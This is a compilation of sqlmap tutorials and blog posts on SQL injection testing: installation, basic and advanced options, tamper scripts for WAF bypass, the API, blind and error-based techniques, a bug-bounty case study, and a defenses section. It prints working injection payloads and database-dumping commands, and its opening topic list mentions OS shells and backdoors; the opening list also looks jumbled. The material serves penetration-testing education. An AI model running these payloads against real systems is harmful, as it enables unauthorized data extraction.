
- Address multi-layered SQL injection challenges, including blind and time-based techniques.
- Combine Sqlmap with tools like Burp Suite for enhanced proxy capabilities.
- Craft complex tamper script chains for highly specific WAF bypass scenarios, adapting to evolving WAF technologies.
- Craft custom injection payloads using --prefix and --suffix options.
- Create custom automation scripts that interface with the Sqlmap API.
- Delve into advanced SQL syntax manipulation, using nested queries, subqueries, and UNION-based injections.
- Design automated workflows for continuous monitoring and exploitation of new or temporary SQL injection vulnerabilities.
- Develop advanced payloads using lesser-known SQL functions and procedures.
- Employ conditional SQL statements to retrieve specific data sets.
- Experiment with Sqlmap's advanced scanning modes for optimized performance.
- Experiment with different encoding methods (URL, Base64, Hex) to camouflage malicious payloads.
- Explore methods for maintaining persistent access through SQL injection, such as integrating backdoors.
- Incorporate Sqlmap into comprehensive penetration testing methodologies.
- Incorporate advanced data extraction techniques like differential analysis and binary search algorithms.
- Investigate timing-based evasion techniques, using time delays to mask SQL injections.
- Leverage the Sqlmap API for automated scanning and exploitation processes.
- Modify existing scripts or create new ones for targeted attacks and advanced evasion techniques.
- Strategize the use of Sqlmap in red team operations, simulating advanced threat actors.
- Tailor Sqlmap's injection techniques for applications with complex input validation or intricate database structures.
- Tweak performance settings including request delay, timeout, and retry count.
- Use --os-shell for direct OS access and --os-pwn for out-of-band connections.
- Utilize API-based integrations with vulnerability scanners, SIEM systems, and custom reporting tools.
- Utilize Sqlmap for database privilege escalation, leveraging SQL injection to execute administrative operations.
- Utilize advanced tamper scripts for specific DBMS and WAFs.
- Utilize tamper scripts like 'between', 'space2comment', and 'charencode' to bypass common WAFs.
---------------------------
----------------------------
---------------------------------
-----------------------------------
---------------------------------------
----------------------------------------
-----------------------------------------
------------------------------------------
Advanced Enumeration and Data Retrieval
Advanced Tamper Script Usage
Automating Sqlmap with APIs
Bypassing Web Application Firewalls (WAFs)
Custom Injection Techniques
Handling Complex SQL Injection Scenarios
Integrating Sqlmap with Other Tools
Optimizing Sqlmap for Performance
Privilege Escalation and Post-Exploitation
Sqlmap in Penetration Testing Workflows


SQL Injection is a type of cyber attack where malicious actors exploit vulnerabilities in web applications to inject malicious SQL code into backend databases. This can lead to the exposure of sensitive data, unauthorized access to systems, and even complete system compromise.

SQLmap is a powerful open-source tool used to automate the process of detecting and exploiting SQL Injection vulnerabilities in web applications. It is a command-line tool that can be used to enumerate databases, extract data, and even execute operating system commands on the underlying system.

Installing SQLmap
SQLmap is a cross-platform tool and can be installed on Windows, Linux, and macOS. Here are the steps to install SQLmap on each of these platforms:

On Windows:
Download the latest version of SQLmap from the official website.
Extract the downloaded file to a desired location.
Open the command prompt and navigate to the extracted SQLmap directory.
Run the “python sqlmap.py” command to start SQLmap.
On Linux:
Open a terminal window and type “sudo apt-get update” to update the system package list.
Type “sudo apt-get install sqlmap” to install SQLmap from the official repository.
Verify the installation by running the “sqlmap” command in the terminal.
On macOS:
Install Homebrew package manager by running the following command in the terminal: “/usr/bin/ruby -e “$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)""
Type “brew install sqlmap” to install SQLmap.
Verify the installation by running the “sqlmap” command in the terminal.
To verify the successful installation, simply run the “sqlmap” command in the terminal or command prompt. If SQLmap is installed correctly, you should see the SQLmap logo and version information displayed in the terminal.

Basic Usage
Using the “sqlmap -u <target URL>” command to scan for vulnerabilities
Using the “sqlmap -u <target URL> — dbs” command to enumerate the list of databases
Using the “sqlmap -u <target URL> -D <database name> — tables” command to enumerate the list of tables in a database
Using the “sqlmap -u <target URL> -D <database name> -T <table name> — dump” command to extract data from a table
Advanced Usage
Modifying HTTP headers and cookies
To modify HTTP headers and cookies during a SQLmap scan, you can use the --headers and --cookie options respectively. Here's an overview of how to use them:

--headers: This option allows you to add or modify HTTP headers for the requests sent during the scan. You can use it to modify headers such as User-Agent, Referer, Cookie, etc.

For example, to modify the User-Agent header to "Mozilla/5.0" during a SQLmap scan, you would use the following command:

sqlmap -u <target URL> --headers="User-Agent: Mozilla/5.0"
--cookie: This option allows you to set or modify cookies for the requests sent during the scan. You can use it to modify cookies such as PHPSESSID, JSESSIONID, etc.

For example, to modify the PHPSESSID cookie to "12345" during a SQLmap scan, you would use the following command:

sqlmap -u <target URL> --cookie="PHPSESSID=12345"
Note that you can also use the --cookie-file option to load cookies from a file. This can be useful if you want to reuse cookies from a previous session.

By modifying HTTP headers and cookies, you can bypass certain security measures that may be in place, such as web application firewalls or authentication systems.

Tampering with request parameters
To tamper with request parameters during a SQLmap scan, you can use the --data and --tamper options. Here's an overview of how to use them:

--data: This option allows you to set or modify the data sent in the request body during the scan. You can use it to modify parameters such as username, password, id, etc.

For example, to modify the id parameter to "1' OR 1=1#" during a SQLmap scan, you would use the following command:

sqlmap -u <target URL> --data="id=1' OR 1=1#"
--tamper: This option allows you to use custom tampering scripts to modify the data sent in the request body. Tampering scripts can be used to encode or encrypt data in a way that bypasses certain security measures, or to modify data in a way that triggers specific SQL Injection vulnerabilities.

For example, to use the apostrophemask.py tampering script to encode apostrophes in a request body, you would use the following command:

sqlmap -u <target URL> --data="id=1' OR 1=1#" --tamper=apostrophemask.py
You can also use multiple tampering scripts by separating them with a comma.

By tampering with request parameters, you can bypass certain security measures that may be in place, such as input validation or sanitization.

Bypassing filters and firewalls
Bypassing filters and firewalls during a SQLmap scan can be done using various techniques. Here are a few examples of how to use SQLmap to bypass different types of security measures:

Bypassing input filters: If a web application filters or blocks certain characters or keywords in input parameters, you can try to bypass the filter by encoding or obfuscating the input. For example, you can try URL encoding, HTML encoding, or using alternate character sets.

To URL encode the id parameter during a SQLmap scan, you would use the following command:

sqlmap -u <target URL> --data="id=%27+OR+1%3D1--"
Bypassing web application firewalls (WAFs): If a web application has a WAF in place that blocks SQL Injection attacks, you can try to bypass the WAF by using a technique called “tamper script evasion”. This involves modifying the SQL Injection payload in a way that bypasses the WAF’s signature detection.

To use the tamper/space2hash.py script to evade a WAF during a SQLmap scan, you would use the following command:

sqlmap -u <target URL> --data="id=1' OR 1=1#" --tamper=tamper/space2hash.py
Bypassing database firewalls: If a database has a firewall in place that blocks certain SQL commands or queries, you can try to bypass the firewall by using a technique called “time-based blind SQL Injection”. This involves sending SQL Injection payloads that cause the database to delay or sleep for a certain amount of time, which can be used to infer information about the database.

To use time-based blind SQL Injection during a SQLmap scan, you would use the following command:

sqlmap -u <target URL> --data="id=1' AND SLEEP(5)--"
Utilizing SQLmap API
The SQLmap API can be used to integrate SQLmap into custom scripts or programs, or to automate SQL Injection testing. Here’s an overview of how to utilize the SQLmap API:

Start the SQLmap server: Before you can use the SQLmap API, you need to start the SQLmap server. To start the server, use the following command:

sqlmapapi.py -s
This will start the SQLmap server on the default port (8775).

Send requests to the API: Once the SQLmap server is running, you can send requests to it using the API. Requests can be sent using HTTP GET or POST methods, and can include various parameters such as the target URL, injection technique, and tamper scripts.

For example, to scan a target URL using the Boolean-based blind injection technique and the apostrophemask.py tamper script, you would send an HTTP POST request to http://localhost:8775/task/new with the following JSON payload:

{
    "url": "<target URL>",
    "technique": "B",
    "tamper": "apostrophemask.py"
}
Get task status and results: After sending a request to the SQLmap API, you can check the status of the task and retrieve the results. Task status can be checked using an HTTP GET request to http://localhost:8775/task/<task ID>/status, while task results can be retrieved using an HTTP GET request to http://localhost:8775/task/<task ID>/data.

For example, to check the status and retrieve the results of a task with ID 1, you would send the following HTTP GET requests:

http://localhost:8775/task/1/status
http://localhost:8775/task/1/data
Utilizing the SQLmap API can be useful for automating SQL Injection testing and integrating SQLmap into custom scripts or programs.

Common Attacks and Countermeasures
Error-based SQL Injection
Error-based SQL Injection is a type of SQL Injection that relies on triggering errors in the target application to extract information from the database. Here’s an overview of how to perform Error-based SQL Injection using SQLmap:

Identify the target: As with any SQL Injection testing, the first step is to identify a target application that may be vulnerable to Error-based SQL Injection.
Determine the injection point: Once you’ve identified a target application, you need to determine where in the application’s input fields or parameters you can inject SQL code. You can use SQLmap’s built-in scanning features to help identify injection points.
Specify the injection technique: After identifying the injection point, you need to specify the Error-based SQL Injection technique using the --technique option. The Error-based SQL Injection technique is designated by the letter E.
Run the injection: Once you’ve specified the injection technique, you can run the injection using the --dump option to extract data from the database.
Here’s an example command to perform Error-based SQL Injection using SQLmap:

sqlmap -u "http://example.com/vulnerable.php?id=1" --technique E --dump
This command specifies the target URL and injection point using the -u option, the Error-based SQL Injection technique using the --technique option, and the --dump option to extract data from the database.

Blind SQL Injection
Blind SQL Injection is a type of SQL Injection that does not display errors or information that can help identify the vulnerability, making it more difficult to detect. Here’s an overview of how to perform Blind SQL Injection using SQLmap:

Identify the target: As with any SQL Injection testing, the first step is to identify a target application that may be vulnerable to Blind SQL Injection.
Determine the injection point: Once you’ve identified a target application, you need to determine where in the application’s input fields or parameters you can inject SQL code. You can use SQLmap’s built-in scanning features to help identify injection points.
Specify the injection technique: After identifying the injection point, you need to specify the Blind SQL Injection technique using the --technique option. The Blind SQL Injection technique is designated by the letter B.
Use the --data option: Blind SQL Injection usually involves sending custom data in the HTTP request to the server. You can use the --data option to specify the data that SQLmap should send.
Use the --string and --not-string options: Blind SQL Injection relies on identifying whether or not certain conditions are true or false, based on the server's response. You can use the --string and --not-string options to specify strings that SQLmap should look for in the server's response to determine whether a condition is true or false.
Here’s an example command to perform Blind SQL Injection using SQLmap:

sqlmap -u "http://example.com/vulnerable.php" --data="username=admin&password=password" --technique B --string="Welcome, admin!" --not-string="Invalid login"
This command specifies the target URL and injection point using the -u option, the custom data to send using the --data option, the Blind SQL Injection technique using the --technique option, and the --string and --not-string options to specify the strings to look for in the server's response.

Defense mechanisms and countermeasures
There are several defense mechanisms and countermeasures that can be used to prevent or mitigate SQL Injection attacks like the ones performed using SQLmap. Here are some common ones:

Parameterized queries: One of the most effective ways to prevent SQL Injection is to use parameterized queries. This involves using placeholders for user input in SQL statements and binding them to typed parameters at runtime, which helps prevent malicious SQL code from being executed.
Input validation and sanitization: Input validation involves checking user input against predefined rules, such as input length, character types, and format, while input sanitization involves filtering out potentially harmful characters or commands from user input. This can help prevent malicious input from being executed as SQL code.
Principle of least privilege: The principle of least privilege involves limiting user privileges and access to only what is necessary for their job functions. This can help prevent SQL Injection attacks by limiting the damage that can be done with stolen or compromised credentials.
Network segmentation and firewalls: Network segmentation involves dividing a network into smaller segments or subnets, each with its own security controls, while firewalls can be used to filter and block traffic based on predefined rules. These measures can help prevent attackers from gaining access to sensitive data or systems.
Web application firewalls (WAFs): WAFs are designed to monitor and filter incoming traffic to web applications, detecting and blocking malicious traffic such as SQL Injection attacks. They work by analyzing traffic patterns and using predefined rules to filter out malicious traffic.
Implementing these defense mechanisms and countermeasures can help prevent or mitigate SQL Injection attacks like the ones that can be performed using SQLmap. It’s important to remember that security is an ongoing process and requires continuous monitoring and updating to stay effective against evolving threats.

Week 7 - Advanced SQLMap
Custom SQLMap Payloads
It’s Week 7 of our Web App Hacking Tips & Tricks Series! Today we’ll be covering one of my favorite topics, Advanced SQL Injection.
 
Have you ever been testing an application that appears vulnerable to SQL Injection, but you were unable to automate using SQLMap? This has happened to me in the past and is a major pain-in-the-butt. I used to add a “tamper=space2comment” and hope for the best! Nowadays I have a much better approach.
 
To start off, I always recommend manually finding a working Proof-of-Concept (POC) with Burp Suite (if you want a future post on manual SQL Injection tips, let me know in the comments). From here, you can add your own custom payload into SQLMap. The folder containing all the payload files can be found here:
 
/usr/share/sqlmap/data/xml/payloads/
 
First, add the payload in the attached photo below to your ‘boolean_blind.xml’ payload file. Since SQLMap can be finnicky, I’ve found that simplifying the custom payload to only its inference is the most reliable method. Then, use the flags ‘prefix’ and ‘suffix’ to construct the rest of the Proof-of-Concept query you’ve found earlier. For example, if your working POC looks like:
 
test.php?id=1']+OR+[1=1]);/*
 
Then to exploit with your custom payload, your SQLMap command would be:
 
sqlmap -u "<target-url>" --dbs --prefix="']+OR+[" --suffix="]);/*"
 
If all goes well, you should have successfully automated SQL Injection using your custom payload!
 
If you find you’re still having trouble or are dealing with connection errors, just proxy through Burp Suite using the ‘proxy’ flag. I’ve found this alone solves a good deal of connection errors. Try the ‘force-ssl’ flag too.


Advanced sqlmap Case Study
May 6, 2022
· 6 min read
 ·
 ·Share on:
Summary
Many new bug bounty hunters will blindly rely on the output of tools to magically find them bugs. As most experienced hunters know, the key to long-term success is to understand how to effectively use the many great tools and fine-tune these tools to achieve results in the form of valuable, challenging bugs.

Since I joined the Synack Red Team, I have been digging into sqlmap and the intricacies involved in finding SQL injections "in the wild". This will be the first of hopefully several posts on how to use sqlmap to work around challenging real-world scenarios where SQL injections exist. I hope you find this useful in your research!

On Manual Testing
In almost all cases I never run sqlmap without first manually confirming the presence of a vulnerability! Don't be an irresponsible hunter - do your research manually or with low-impact scanning first!

Scenario
In this scenario I was able to find a SQL injection vulnerability through source code auditing of the application I was testing. The application took a certain parameter and issued 2 SQL queries with it. The first query looked like this (partial query):

... select OID from pg_namespace where nspname='{parameter}' ...
If this query succeeded (returned a row), the code would issue a 2nd query as below:

select distinct object from {parameter} ...
If the first query did not return a row, the code would instead throw a Python error:

AttributeError: 'NoneType' object has no attribute
So this means that in order to pass both queries the {parameter} needed to be a valid string in the first query and a valid table or view name in the 2nd query! Unfortunately this is inherently incompatible with the need to be able to construct a valid boolean true/false expression. I had to find another approach.

The Approach
I determined that it was not going to be possible to get a payload that would successfully pass both queries, therefore I determined that I had to construct a payload that would satisfy the first query enough to generate a true/false result. "True" would mean the code would successfully execute the first query, and fail in the 2nd query. "False" would mean the code would successfully execute the first query, but because a row was not returned from the query, it would generate the AttributeError message. This got me set up with the "True" and "False" conditions I needed for sqlmap to work properly:

"True": Error message contains select distinct object from
"False": Error message contains AttributeError: 'NoneType'
One other Wrinkle
Because of the nature of the code involved, the SQL injection payload needed to be placed in the middle of the query parameter string in a specific location. Let's say the query parameter looked like this:

param=canary.bluebird
The position of the SQL injection payload had to be here:

param=canary.bluebird
          ^^
Basically, it had to be placed before the . character, in the middle of the string, in order for the first SQL query to successfully execute.

Validating the Approach
I tested this approach by the following query:

param=`cana'||(select/**/'r'/**/where/**/1=1)||'y.bluebird`
I confirmed this corresponded to the "true" result (getting past the first SQL query and a syntax error on the 2nd). Changing the 1=1 to 0=1 confirmed the behavior of the "false" result (AttributeError). Great!

Now, on to getting sqlmap to follow this same manual approach.

A Couple more Wrinkles
A few other wrinkles came up in my manual testing:

Both "true" and "false" resulted in an error page with HTTP status 500
The URL parameter had to be issued without URL encoding (i.e. ' instead of %27)
Because of this, the inclusion of space characters would break the request, so they had to be replaced with comments /**/
I had to make sure that sqlmap followed these as well.

Wrangling sqlmap
Let's get the easy stuff out of the way first:

Don't encode URL parameters: use the --skip-urlencode flag
Change spaces to comments: use the --tamper=space2comment flag to invoke this tamper script
Tamper scripts modify the payload before it is sent to the target site!
Match HTTP code 500 as part of the "true" result: use the --code=500 flag
As an interesting side note: without this, sqlmap will assume a non-2xx status code is a failure (neither true nor false) and will ignore the result
Now we need to get the positioning of the payload correct. We can use the --prefix and -suffix flags for this as follows:

--prefix="cana'||" --suffix="||'y.bluebird"
If you are following along, you might wonder where the r character in canary went. Remember the injection point needs to be before the . in the valid parameter string. Remember a valid query "true/false" will look like this:

param=`cana'||(select/**/'r'/**/where/**/1=1)||'y.bluebird`
You can see the r is being returned from the inner select statement if the where clause evaluates to "true". If it evaluates to "false", no value is returned, and we know that the parameter value of canay.bluebird (no r) will return 0 rows. This type of SQL injection corresponds to the sqlmap payload with "original value" in the name.

Tip: sqlmap has two types of payloads: one where the boolean condition returns the original value inline in the query, and the other where the boolean result is appended to the original value (the classic AND 1=1 type of payload)
In this case, trying to get an AND 1=1 type payload in the middle of our parameter would make no sense at all! Therefore we're looking only for blind boolean payloads that use the original value in the constructed query string.

The final piece of the puzzle is helping sqlmap determine a true vs false result. In this case we use the --string parameter to suggest to sqlmap text that is guaranteed only to appear when the boolean value is true. In our analysis we determined the displayed error message will contain the string select distinct object from.

Putting it all together, the final sqlmap command line looked like this:

...&param=r -p param --prefix="cana'||" --suffix="||'y.bluebird" --tamper space2comment --level=3 --risk=2 --string "select distinct object from ucon_p" --code=500 --dbms PostgreSQL --skip-urlencode --no-escape --no-cast --banner --technique=B
With this combination of parameters I was able to translate my manual confirmation of the SQLi with the automatic data gathering magic of sqlmap

Feedback?
Hopefully this article was helpful in outlining how to reason through a complex SQL injection vulnerability. If you have any comments or want to collaborate on a report feel free to DM me on Twitter, I'm always open to collaboration with trusted people.

Links
A couple other resources that cover this sort of advanced sqlmap content well:

https://cybr.com/ethical-hacking-archives/sqlmap-cheat-sheets-to-help-you-find-sql-injections/
https://thegreycorner.com/2017/01/05/exploiting-difficult-sql-injection.html

Exploiting difficult SQL injection vulnerabilities using sqlmap: Part 1
05 Jan 2017
Introduction
Useful sqlmap options
Prefix and suffix
Specifying Injection technique and tests
Risks and levels
Detection options
Second order injection
Tamper scripts
Custom written test payloads
Verbosity and debugging injection checks
Auto answering
Session flushing
Other options
Tweaking sqlmap options to detect tricky injections
Introduction

A number of times when discovering "tricky" SQL Injection vulnerabilities during penetration tests, I have taken the approach of exploiting them by writing custom tools.  This usually after spending 5 minutes blindly poking at the vulnerability with sqlmap, and then stopping when it didn't immediately magic the answer for me.

OK, there have been a number of times where sqlmap has NOT been a suitable tool to use for various reasons, such as very particular filtering or data retrieval requirements, but there has also been a number of cases where I probably gave up on it too fast because I didn't properly understand how it worked or the extent of its capabilities. And this resulted in me taking much longer than necessary to exploit the vulnerability.

While writing custom tools can certainly be "fun" (for some definitions of "fun"), and while it provides some good coding practice and is an excellent way to ensure that you understand the injection flaw and its exploitation extremely well, its also very time consuming.  Writing your own injection tool often involves redoing a lot of work that has already been done by others - the digital equivalent of reinventing the wheel. You need to put together a capable HTTP sending/receiving framework, you need to parse HTML responses, you need to discover the (database specific) SQL commands that will allow you to retrieve data within the limitations imposed by the vulnerability, you need to be able to extract, group, infer, convert and/or join the retrieved data and you need to mentally map out the logic needed to tie all these parts together and turn it into working code with a usable interface. Its a deceptively large amount of effort, especially when blind injection is involved, and I would consistently underestimate how long it would take to perform.

Given that sqlmap already has all this functionality, being in particular a very effective tool for retrieving data via all types of SQL injection vulnerabilities,  I recently decided that it might be a good idea to spend some of my time to gain an improved understanding of the tool, so that in future I would be able to make more frequent use of it.

For my vulnerability test bed, I used some of the SQL injection labs from the Pentester Labs website, namely the Web for Pentester and Web for Pentester II exercises, because those particular exercises are freely downloadble, easy to self host and provide some great examples of SQLi vulnerabilities that require use of some of sqlmap's custom options for exploitation.

This will be the first in a series of posts where I share some of what I learned during this process. This first post will mainly seek to introduce and explain the relevant sqlmap options that I used and outline a process that can be used to get sqlmap to identify an SQL injection flaw that you have discovered through other testing activities.  Future entries will provide examples of actually using this to exploit SQL injection vulnerabilities that sqlmap cannot easily detect on its own.

Note: While I will use their content as examples, the intent here is NOT to explain how to discover or do manual exploitation of the SQLi vulnerabilities in the PentesterLab exercises - because that has already been written up in the PentesterLab courseware available at their web site. If you don't already know how to do manual discovery of SQLi vulnerabilities, you can check out their site, or any of the many other SQLi references on the Internet to learn this (for the record though, I think the PentesterLab stuff is a fantastic introduction to web application pentesting, and I wish I had access to it when I first started doing webapp testing).

Useful sqlmap options

Before I jump into working through specific examples, I wanted to describe the purpose of some sqlmap options.  More advanced use of sqlmap, in terms of actually tweaking its operation in order to make a difficult injection operate, will require that you actually understand how these options work. In essence, this is the README I wish I had received when I moved beyond the bare basics in my use of the tool, as I definitely would have used sqlmap much more extensively had I understood these particular options as well as I do now. Hopefully you can now benefit from my having learned this the "hard" way, e.g. via trial and error.

Prefix and suffix

The prefix (--prefix) and suffix (--suffix) options configure the strings that should be included with each SQL injection payload in order to begin, and then terminate, the Injection.  So what does this mean exactly?

Take this simple example of an injectible query:

$query = "SELECT first_name, last_name FROM users WHERE name = '" . $_GET["username"] . "'";


Whats an example of an injection string that would work here?  Something like the following would work as a simple POC of a union injection.

' UNION SELECT NULL,NULL -- a


This closes the single quoted string before our injection point with a single quote ('), seperates the next statement with a space ( ), adds our injection query of a UNION SELECT with a column count matching that of the existing SELECT query, and then comments out the remainder of the original query to ensure syntactical correctness.  The prefix in this case is the single quote and space (' ) used  before the UNION SELECT, and the suffix is the characters (a space, two dashes, another space and the letter "a") used to comment out the remainder of the original query ( -- a).

The following options can be used to configure sqlmap to use this prefix and suffix:

 --prefix="' " --suffix=' -- a'


Now, these particular examples of prefixes and suffixes (or ones that are functionality identical) are ones that sqlmap will be able to figure out itself, so you will rarely need to specify values like this.  However, this hopefully does help you in understanding what these options do, because they are quite important ones to grasp if you want to use sqlmap for more difficult injections. In fact, I put these options first in the list of ones I wanted to describe because as I was working through this process of learning how to make sqlmap identify certain injection vulnerabilities, these were the ones that I used the most.  Also, finally learning what these did was an "AHA!" moment for me, as I have been aware of the options existence for an embarassingly long time without understanding what they did.

Note: Why use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates.
Note2: Why the extra space and the "a" character after the comment? Sometimes, inserted comments at the end of an injection are not properly recognised by the database unless there is a whitespace character to follow. Since whitespace characters on their own are sometimes not easily identifiable when displayed on screen (depending on what other text follows) its helpful to include other text afterwards so you can easily see there is something following the comment. You will see sqlmap do this when you look at some of the injection strings it uses.

Specifying Injection technique and tests

There are a number of different SQL injection techniques available for use in sqlmap, which are configured via the --technique option, and sqlmap comes with a number of different in built tests for exploiting vulnerabilities using those techniques. By default, sqlmap will enable all possible techniques when trying to identify an injection vulnerability, and will run all associated tests that meet the configured risk and level settings (discussed later).

If you have manually discovered a SQL injection flaw in a website and want to use sqlmap to exploit the vulnerability, you may already know the correct technique, as well as the most appropriate payload configuration to use, and this is where specifying these options manually can be useful. Manual specification of these settings helps prevents less effective techniques from being chosen by sqlmap, and cuts down on the amount of traffic sent by sqlmap during its detection period.

A brief listing of the injection techniques available for use by sqlmap is listed below in order of preference. You can select the appropriate ones by using the --technique switch followed by a listing of the letters associated with the method/s you wish to use.  The default is all options, (e.g. "--technique=BEUSTQ").  The descriptions provided below are only intended as high level reminders of each technique
Stacked queries (S) - This involves stacking whole new SQL queries onto the end of the existing injectable query. Its the preferred method to use if available, because there are a number of exploitation actions that wont be available to you using any other method, however the use of this method does require support from the database and API. You may not necessarily be able to see the results of your stacked query in the page response, so when actually retrieving data (as opposed to performing other operations such as INSERTS) you may want to use another technique such as Unions.
Union query based (U) - This involves retrieving data by joining a second select statement to the original, via the UNION SELECT statement. You need to be able to see the results from the original SELECT query (and hence your UNION) in the page response for this method to be usable.
Error based (E) - This technique retrieves data by manipulating database error messages to directly display that data. To use this method, you need to be able to see database error messages in page responses.
Inline queries (I) - This technique uses inline database queries to retrieve data - essentially a query embedded within another query like this "SELECT (SELECT password from user) from product".  I have not personally had the occasion to use this option in sqlmap, and while inline queries can be used more widely than this in manual injection scenarios, it appears that you need to be able to see the inline queries result in the page response for this to be usable through sqlmap.
Boolean blind (B) - This retrieves data from the database by asking a series of True/False style questions in your injections, and determining the result (True or False) based on identifiable changes in the response. To use this option, you need to be able to be able to trigger some sort of identifiable state change in HTTP response content from logically different, but syntactically correct database queries (e.g. a different page response only resulting from an invalid database query doesn't count here).  This technique will require more requests and time to perform than those previously listed, as the data must be retrieved indirectly via boolean inference.
Time based blind (T) - This technique is similar to boolean blind, in that it retrieves data via posing a number of True/False style questions to the database, however instead of determining the answers to these questions via the content of a response, it is done using the amount of time a response takes. This is done through associating deliberate delays with particular answers via database statements that consume a noticeable amount of time, like sleep. This is the most time consuming method of data retrieval, and is sensitive to errors introduced by network load. Without careful custom configuration, you may find sqlmap selecting this technique for trickier injection vulnerabilities that can be exploited by more efficient means.


Selecting a particular technique, or set of techniques will limit the payloads that sqlmap will use to those associated with that/those technique/s. It is also possible to further filter the attempted payloads via the --test-filter and --test-skip options to target payloads that contain (or do not contain) particular text within their name.

If, for example, you know your target SQLi vulnerability exists within the 'ORDER BY' clause of a query, why not filter for only these test payloads by using:

--test-filter='ORDER BY'


In addition, if you write your own custom test payload for an injection, you can use only that particular payload by setting a filter for a unique string you have added to the name.

Note: To have the best chance of being able to configure sqlmap to detect and exploit a given difficult vulnerability, its important that you properly understand the type of injection you wish to use and the requirements for its exploitation. This is because for injection vulnerabilities that sqlmap cannot find on its own you have to be able to create an effective POC exploit manually to use as a basis for correctly setting sqlmap's configuration . Hopefully this brief summary of the available injection types is appropriately clear and detailed in order to provide a sufficient refresher, but if you are unclear on these techniques you may wish to do further research on any techniques you are unfamiliar with before continuing.


Risks and levels

The risks and levels settings in sqlmap will control which test payloads will be attempted during the detection run to identify an SQLi vulnerability. Each test payload has a configured level and risk setting, and if the configured threshold is not met for that payload during a particular run of the tool, that particular payload will not be used.

Risk in sqlmap refers to the risk of a failure, potential database damage or error in data retrieval associted with using an associated payload.  Available risk settings range from 1 to 3, with 1 (the lowest level) being the default.

Level refers to the number of requests required to use that associated payload for exploitation. Available level settings range from 1 to 5, with 1 again the default.

A common recommendation given in various usage guides is to increase the risk and level settings if sqlmap does not identify a vulnerability in its default configuration, however in my experience for trickier injection vulnerabilities this change alone is often not sufficient.


Detection options

Using the boolean blind injection technique will often require that you tell sqlmap what to look for in the HTTP response content in order to distinguish a True condition from a False. There are a number of options in sqlmap that allow you to configure this behavior, such as --string and --not-string (configuring strings that should appear in True and False responses respectively), --regexp (allowing you to set a regular expression to match to determine the True condition), --code (provide a HTTP status code to match True), --text-only (compare responses based on text content) and --titles (compare responses based on page title).

A neat thing you can do with the --string and --not-string settings is to use Python hexadecimal backslash quoting to do multi line matching. Here is an example showing how to match a section of HTML that includes newlines (\x0a) and tabs (\x09).


--string='Name\x0a\x09\x09Stephen'

When your detection needs are more complex than what can be satisfied by the above options, there is also another sqlmap feature that with a little bit of imagination you can abuse in order to perform more complex comparative logic, which leads us to...

Second order injection

sqlmap contains a --second-order option, which is intended to be used to enable exploitation of second order SQL injection vulnerabilities, where the results of an SQL injection need to be retrieved from a different URL than that is used to actually perform the injection.  The option allows you to provide a single URL which will be requested by sqlmap after each injection payload is sent, and then parsed as per normal configured sqlmap behavior.

By setting the --second-order option to point to your own locally run custom forwarding and parsing server, you can make use of this option to return arbitrary content to sqlmap, perhaps based on data you have automatically retrieved from the target site. This capability can be used to do things such as retrieve data from a dynamically changing second order URL at the target site, or to retrieve content from the remote site and perform complex parsing or logic checks on it, passing through to sqlmap something that it can process using its inbuilt functionality.

This link contains a modifiable second-order forwarding server that I wrote in Python to work with sqlmap, which can be run locally from the command line.  It starts its own http server locally on the loopback address, and when it receives a request from sqlmap it can request data from another website, then return the (optionally) parsed data back to sqlmap.  It is based on Python classes that I wrote specifically to facilitate reuse and modification, so if you can code simple Python you can change it to do any parsing or fetching job you wish.


Tamper scripts

Tamper scripts in sqlmap allow you to make programmatic changes to all the request payloads sent by sqlmap, in order to facilitate the bypass of web application firewalls and other filters.  If you are dealing with filters that prohibit, for example, all whitespace within an injection string, there is a tamper script configured that can help (--tamper=space2comment).  A reasonably up to date listing of available tamper scripts and their purpose is available here.


Custom written test payloads

sqlmap comes configured with a large number of test payloads that it can use to perform injections. These are defined within xml files named after the associated injection technique stored in xml/payloads under the sqlmap root path.  You can add your own payloads into these files by copying the xml nodes of an existing test (one thats simlar to the one you want to create) and modifying it as required.  There is an example of doing this here, and a specific example of how to use custom test payloads to exploit a boolean blind issue inside the ORDER BY clause will be provided in a future post.


Verbosity and debugging injection checks

One extremely useful option for troubleshooting sqlmap's detection process is the output verbosity option.  The specific setting I use most frequently when getting an injection working is -v3, which will show each raw payload that is sent by sqlmap. This allows you to compare the payloads sent by sqlmap to your own POC SQL injection string developed during discovery of the vulnerability, to determine where sqlmap is incorrectly diverging.  If you need to use tamper scripts as well to bypass a filter, you can try verbosity level -v4 to also see the HTTP requests sent, as -v3 verbosity will not show the affect of tamper scripts.

Note: You can also configure sqlmap to work through an intercepting proxy for debugging purposes.  However, while I generally always have Burp Suite running when Im testing any web application, I usually prefer to avoid filling up my proxy history and slowing down the operation of sqlmap by doing this. Sometimes, if I really want to have a close look at requests and responses, I will run up a separate proxy instance using something like ZA Proxy.


Auto answering

Under certain circumstances, sqlmap will ask you the same set of one or more repeated questions every time you run the tool. Some of these questions are without their own associated command line options, and therefore without an obvious way to inform sqlmap of the desired behavior so you don't have to repeatedly answer the same question the same way every time sqlmap prompts you.  The --answers option allows you to provide a standard response to these questions - to use it, pick a unique term from the question itself, and provide this along with the desired response.

For example, to preemptively answer Yes to allow sqlmap to attempt to "optimize" timing settings during blind timing based injections, use the following.

--answers='optimize=Y'

Session flushing

sqlmap keeps session information about each url, including which techniques and payloads have been confirmed to work and what data has been retrieved from the site.  If a non optimal payload type has been associated with a particular url within the relevant session, you may want to clear that session information in order to try and get a new payload to work.  You can flush all data associated with a URL, and force the detection process to run again, using the following option.

--flush-session


Other options

Some other options I commonly use are the parameter option which specifies which parameter is used to perform the injection (e.g. -p 'vulnerable_parameter') and the options to specify the database (e.g. --dbms='mysql') and the Operating System (--os='linux') in use on the remote server.  These all help sqlmap to avoid making extraneous requests beyond what you already know will be effective based on your knowledge of the target web application.  Sometimes of course the injection point is not within a parameter, in which case sqlmap has other options which can be used to target its operation, such as the asterisk character (*) which can be used to set manual injection point within a request.


Tweaking sqlmap options to detect tricky injections

Before you can use sqlmap to effectively exploit an injection issue, you must get it to detect the vulnerability, which associates one or more injection techniques and payloads with the URL associated with the issue.  Once this has occurred, the detection process does not need to run again, and sqlmaps options for exploitation and data retrieval can be immediately used on subsequent executions of the tool.

The following is the process I use for taking a manually discovered SQL injection vulnerability and configuring sqlmap to exploit it.
